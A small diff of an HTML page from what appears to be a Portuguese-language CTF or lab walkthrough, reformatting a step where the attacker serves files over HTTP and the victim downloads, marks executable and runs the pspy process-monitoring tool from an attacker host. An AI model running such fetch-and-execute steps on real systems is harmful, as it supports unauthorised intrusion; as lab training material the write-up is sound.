@@ -72,7 +72,8 @@ acessando ela temos um arquivo chamada 1.txt, usando o hashanalyser(https://www.
 
 <h4>
 atacante: python3 -m http.server <br/>
-vítima: wget http://ip_kali:8000/pspy <br/>
+vítima: <br/>
+	wget http://ip_kali:8000/pspy <br/>
 	chmod +x pspy <br/>
 	./pspy
 </h4>
